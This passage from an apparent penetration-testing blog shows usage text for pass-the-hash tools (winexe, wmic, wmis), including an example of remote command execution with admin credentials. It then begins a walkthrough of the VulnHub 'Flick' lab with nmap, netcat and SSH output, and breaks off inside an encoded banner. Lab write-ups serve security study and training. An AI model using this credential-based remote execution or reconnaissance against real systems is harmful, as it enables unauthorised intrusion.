<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Use: sqsh [-a count] [-A packet_size] [-b] [-B] [-c [cmdend]] [-C sql]
</span><span class='line'>          [-d severity] [-D database] [-e] [-E editor] [-f severity]
</span><span class='line'>          [-G TDS version] [-h] [-H hostname] [-i filename] [-I interfaces]
</span><span class='line'>          [-J charset] [-k keywords] [-K keytab] [-l level|flags]
</span><span class='line'>          [-L var=value] [-m style] [-n {on|off}] [-N appname] [-o filename]
</span><span class='line'>          [-p] [-P [password]] [-Q query_timeout] [-r [sqshrc]]
</span><span class='line'>          [-R principal] [-s colsep] [-S server] [-t [filter]]
</span><span class='line'>          [-T login_timeout] [-U username] [-v] [-V [bcdimoqru]] [-w width]
</span><span class='line'>          [-X] [-y directory] [-z language] [-Z [secmech]]
</span><span class='line'>
</span><span class='line'> -a  Max. # of errors before abort       -m  Set display mode
</span><span class='line'> -A  Adjust TDS packet size              -n  Set chained transaction mode
</span><span class='line'> -b  Suppress banner message on startup  -N  Set Application Name (sqsh)
</span><span class='line'> -B  Turn off file buffering on startup  -o  Direct all output to file
</span><span class='line'> -c  Alias for the 'go' command          -p  Display performance stats
</span><span class='line'> -C  Send sql statement to server        -P  Sybase password (NULL)
</span><span class='line'> -d  Min. severity level to display      -Q  Query timeout period in seconds
</span><span class='line'> -D  Change database context on startup  -r  Specify name of .sqshrc
</span><span class='line'> -e  Echo batch prior to executing       -R  Network security server principal
</span><span class='line'> -E  Replace default editor (vi)         -s  Alternate column separator (\t)
</span><span class='line'> -f  Min. severity level for failure     -S  Name of Sybase server ($DSQUERY)
</span><span class='line'> -G  TDS version to use                  -t  Filter batches through program
</span><span class='line'> -h  Disable headers and footers         -T  Login timeout period in seconds
</span><span class='line'> -H  Set the client hostname             -U  Name of Sybase user
</span><span class='line'> -i  Read input from file                -v  Display current version and exit
</span><span class='line'> -I  Alternate interfaces file           -V  Request network security services
</span><span class='line'> -J  Client character set                -w  Adjust result display width
</span><span class='line'> -k  Specify alternate keywords file     -X  Enable client password encryption
</span><span class='line'> -K  Network security keytab file (DCE)  -y  Override value of $SYBASE
</span><span class='line'> -l  Set debugging level                 -z  Alternate display language
</span><span class='line'> -L  Set the value of a given variable   -Z  Network security mechanism</span></code></pre></td></tr></table></div></figure>


<p><strong>pth-winexe</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>winexe version 1.1
</span><span class='line'>This program may be freely redistributed under the terms of the GNU GPLv3
</span><span class='line'>Usage: winexe [OPTION]... //HOST COMMAND
</span><span class='line'>Options:
</span><span class='line'>  -?, --help                                  Display help message
</span><span class='line'>  -U, --user=[DOMAIN/]USERNAME[%PASSWORD]     Set the network username
</span><span class='line'>  -A, --authentication-file=FILE              Get the credentials from a file
</span><span class='line'>  -k, --kerberos=STRING                       Use Kerberos, -k [yes|no]
</span><span class='line'>  -d, --debuglevel=DEBUGLEVEL                 Set debug level
</span><span class='line'>      --uninstall                             Uninstall winexe service after remote execution
</span><span class='line'>      --reinstall                             Reinstall winexe service before remote execution
</span><span class='line'>      --system                                Use SYSTEM account
</span><span class='line'>      --profile                               Load user profile
</span><span class='line'>      --convert                               Try to convert characters between local and remote code-pages
</span><span class='line'>      --runas=[DOMAIN\]USERNAME%PASSWORD      Run as user (BEWARE: password is sent in cleartext over net)
</span><span class='line'>      --runas-file=FILE                       Run as user options defined in a file
</span><span class='line'>      --interactive=0|1                       Desktop interaction: 0 - disallow, 1 - allow. If you allow use also --system switch (Win
</span><span class='line'>                                              requirement). Vista do not support this option.
</span><span class='line'>      --ostype=0|1|2                          OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide. Determines which version (32-bit or 64-bit)
</span><span class='line'>                                              of service will be installed.</span></code></pre></td></tr></table></div></figure>


<p><strong>pth-wmic</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: [-?|--help] [--usage] [-d|--debuglevel DEBUGLEVEL] [--debug-stderr]
</span><span class='line'>        [-s|--configfile CONFIGFILE] [--option=name=value]
</span><span class='line'>        [-l|--log-basename LOGFILEBASE] [--leak-report] [--leak-report-full]
</span><span class='line'>        [-R|--name-resolve NAME-RESOLVE-ORDER]
</span><span class='line'>        [-O|--socket-options SOCKETOPTIONS] [-n|--netbiosname NETBIOSNAME]
</span><span class='line'>        [-W|--workgroup WORKGROUP] [--realm=REALM] [-i|--scope SCOPE]
</span><span class='line'>        [-m|--maxprotocol MAXPROTOCOL] [-U|--user [DOMAIN\]USERNAME[%PASSWORD]]
</span><span class='line'>        [-N|--no-pass] [--password=STRING] [-A|--authentication-file FILE]
</span><span class='line'>        [-S|--signing on|off|required] [-P|--machine-pass]
</span><span class='line'>        [--simple-bind-dn=STRING] [-k|--kerberos STRING]
</span><span class='line'>        [--use-security-mechanisms=STRING] [-V|--version] [--namespace=STRING]
</span><span class='line'>        [--delimiter=STRING]
</span><span class='line'>        //host query
</span><span class='line'>
</span><span class='line'>Example: wmic -U [domain/]adminuser%password //host "select * from Win32_ComputerSystem"</span></code></pre></td></tr></table></div></figure>


<p><strong>pth-wmis</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: [-?|--help] [--usage] [-d|--debuglevel DEBUGLEVEL] [--debug-stderr]
</span><span class='line'>        [-s|--configfile CONFIGFILE] [--option=name=value]
</span><span class='line'>        [-l|--log-basename LOGFILEBASE] [--leak-report] [--leak-report-full]
</span><span class='line'>        [-R|--name-resolve NAME-RESOLVE-ORDER]
</span><span class='line'>        [-O|--socket-options SOCKETOPTIONS] [-n|--netbiosname NETBIOSNAME]
</span><span class='line'>        [-W|--workgroup WORKGROUP] [--realm=REALM] [-i|--scope SCOPE]
</span><span class='line'>        [-m|--maxprotocol MAXPROTOCOL] [-U|--user [DOMAIN\]USERNAME[%PASSWORD]]
</span><span class='line'>        [-N|--no-pass] [--password=STRING] [-A|--authentication-file FILE]
</span><span class='line'>        [-S|--signing on|off|required] [-P|--machine-pass]
</span><span class='line'>        [--simple-bind-dn=STRING] [-k|--kerberos STRING]
</span><span class='line'>        [--use-security-mechanisms=STRING] [-V|--version]
</span><span class='line'>        //host
</span><span class='line'>
</span><span class='line'>Example: wmis -U [domain/]adminuser%password //host cmd.exe /c dir c:\ &gt; c:\windows\temp\output.txt </span></code></pre></td></tr></table></div></figure>


<blockquote><p>People are beginning to notice you.  Try dressing before you leave the house.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Flick]]></title>
    <link href="http://chousensha.github.io/blog/2015/02/09/pentest-lab-flick/"/>
    <updated>2015-02-09T08:22:24-05:00</updated>
    <id>http://chousensha.github.io/blog/2015/02/09/pentest-lab-flick</id>
    <content type="html"><![CDATA[<p>The next challenge I&rsquo;m going for from the myriad of options on VulnHub will be Flick, by <a href="https://www.vulnhub.com/author/leonjza,57/">Leonjza</a>!</p>

<blockquote><p>Welcome to the flick boot2root!</p>

<ul>
<li>Where is the flag?</li>
<li>What do you need to flick to find it?</li>
</ul>


<p>Completing &ldquo;flick&rdquo; will require some sound
thinking, good enumeration skills &amp; time! The
objective is to find and read the flag that
lives /root/</p>

<p>As a bonus, can you get root command execution?</p></blockquote>

<!-- more -->




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.80.129
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-09 15:28 EET
</span><span class='line'>Nmap scan report for 192.168.80.129
</span><span class='line'>Host is up (0.00056s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT     STATE SERVICE VERSION
</span><span class='line'>22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 04:d0:8d:4d:ee:87:30:e7:60:82:63:d3:a8:6e:4b:ac (DSA)
</span><span class='line'>|   2048 64:ec:a9:9b:0b:c0:11:d4:08:63:cf:83:e1:db:23:9a (RSA)
</span><span class='line'>|_  256 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02 (ECDSA)
</span><span class='line'>8881/tcp open  unknown
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
</span><span class='line'>SF-Port8881-TCP:V=6.47%I=7%D=2/9%Time=54D8B5FC%P=x86_64-unknown-linux-gnu%
</span><span class='line'>SF:r(NULL,5F,"Welcome\x20to\x20the\x20admin\x20server\.\x20A\x20correct\x2
</span><span class='line'>SF:0password\x20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20ne
</span><span class='line'>SF:w\x20door:\n&gt;\x20")%r(GetRequest,78,"Welcome\x20to\x20the\x20admin\x20s
</span><span class='line'>SF:erver\.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20switch
</span><span class='line'>SF:\x20and\x20open\x20a\x20new\x20door:\n&gt;\x20OK:\x20GET\x20/\x20HTTP/1\.0
</span><span class='line'>SF:\r\n\r\n\n&gt;\x20")%r(FourOhFourRequest,9B,"Welcome\x20to\x20the\x20admin
</span><span class='line'>SF:\x20server\.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x20s
</span><span class='line'>SF:witch\x20and\x20open\x20a\x20new\x20door:\n&gt;\x20OK:\x20GET\x20/nice%20p
</span><span class='line'>SF:orts%2C/Tri%6Eity\.txt%2ebak\x20HTTP/1\.0\r\n\r\n\n&gt;\x20")%r(GenericLin
</span><span class='line'>SF:es,6A,"Welcome\x20to\x20the\x20admin\x20server\.\x20A\x20correct\x20pas
</span><span class='line'>SF:sword\x20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x2
</span><span class='line'>SF:0door:\n&gt;\x20OK:\x20\r\n\r\n\n&gt;\x20")%r(HTTPOptions,7C,"Welcome\x20to\x
</span><span class='line'>SF:20the\x20admin\x20server\.\x20A\x20correct\x20password\x20will\x20'flic
</span><span class='line'>SF:k'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n&gt;\x20OK:\x20OP
</span><span class='line'>SF:TIONS\x20/\x20HTTP/1\.0\r\n\r\n\n&gt;\x20")%r(RTSPRequest,7C,"Welcome\x20t
</span><span class='line'>SF:o\x20the\x20admin\x20server\.\x20A\x20correct\x20password\x20will\x20'f
</span><span class='line'>SF:lick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n&gt;\x20OK:\x2
</span><span class='line'>SF:0OPTIONS\x20/\x20RTSP/1\.0\r\n\r\n\n&gt;\x20")%r(RPCCheck,92,"Welcome\x20t
</span><span class='line'>SF:o\x20the\x20admin\x20server\.\x20A\x20correct\x20password\x20will\x20'f
</span><span class='line'>SF:lick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\n&gt;\x20OK:\x2
</span><span class='line'>SF:0\x80\0\0\(r\xfe\x1d\x13\0\0\0\0\0\0\0\x02\0\x01\x86\xa0\0\x01\x97\|\0\
</span><span class='line'>SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\n&gt;\x20")%r(DNSVersionBindReq,86,"
</span><span class='line'>SF:Welcome\x20to\x20the\x20admin\x20server\.\x20A\x20correct\x20password\x
</span><span class='line'>SF:20will\x20'flick'\x20the\x20switch\x20and\x20open\x20a\x20new\x20door:\
</span><span class='line'>SF:n&gt;\x20OK:\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\
</span><span class='line'>SF:0\x10\0\x03\n&gt;\x20")%r(DNSStatusRequest,74,"Welcome\x20to\x20the\x20adm
</span><span class='line'>SF:in\x20server\.\x20A\x20correct\x20password\x20will\x20'flick'\x20the\x2
</span><span class='line'>SF:0switch\x20and\x20open\x20a\x20new\x20door:\n&gt;\x20OK:\x20\0\x0c\0\0\x10
</span><span class='line'>SF:\0\0\0\0\0\0\0\0\0\n&gt;\x20");
</span><span class='line'>MAC Address: 00:0C:29:7A:27:7B (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.11 - 3.14
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure>


<p>Not much to work with. I netcat&#8217;ed to the 8881 port:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.80.129 8881
</span><span class='line'>Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
</span><span class='line'>&gt; letmein?
</span><span class='line'>OK: letmein?
</span><span class='line'>
</span><span class='line'>&gt; </span></code></pre></td></tr></table></div></figure>


<p>I tried bombarding it with long strings to see how it would behave, but nothing happened. Next thing I just thought to try SSH and it would seem this is the more likely route:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh 192.168.80.129 
</span><span class='line'>The authenticity of host '192.168.80.129 (192.168.80.129)' can't be established.
</span><span class='line'>ECDSA key fingerprint is 2d:32:93:ce:0e:54:3f:84:ee:01:c7:c0:bb:68:e2:02.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added '192.168.80.129' (ECDSA) to the list of known hosts.
</span><span class='line'>
</span><span class='line'>\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
</span><span class='line'>\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
</span><span class='line'>\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
</span><span class='line'>\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
</span><span class='line'>\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
</span><span class='line'>\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
</span><span class='line'>\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
</span><span class='line'>\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
</span><span class='line'>\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
</span><span class='line'>\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
</span><span class='line'>\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
</span><span class='line'>\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
</span><span class='line'>\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
</span><span class='line'>\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
</span><span class='line'>\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
</span><span class='line'>\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
</span><span class='line'>\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
</span><span class='line'>\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
</span><span class='line'>\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
</span><span class='line'>\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
</span><span class='line'>\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
</span><span class='line'>\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
</span><span class='line'>\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
</span><span class='line'>\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
</span><span class='line'>\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
</span><span class='line'>\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
</span><span class='line'>\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
</span><span class='line'>\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
</span><span class='line'>\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
</span><span class='line'>\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
</span><span class='line'>\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
</span><span class='line'>\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
</span><span class='line'>\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
</span><span class='line'>\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
</span><span class='line'>\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
</span><span class='line'>\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
</span><span class='line'>\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
</span><span class='line'>\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
</span><span class='line'>\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
</span><span class='line'>\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
</span><span class='line'>\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
</span><span class='line'>\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
</span><span class='line'>\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
</span><span class='line'>\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
</span><span class='line'>\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
</span><span class='line'>\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
</span><span class='line'>\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
</span><span class='line'>\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
</span><span class='line'>\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
</span><span class='line'>\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
</span><span class='line'>\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
</span><span class='line'>\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
</span><span class='line'>\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
</span><span class='line'>\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
</span><span class='line'>\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
</span><span class='line'>\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
</span><span class='line'>\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
</span><span class='line'>\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
</span><span class='line'>\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
</span><span class='line'>\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
</span><span class='line'>\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
</span><span class='line'>\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
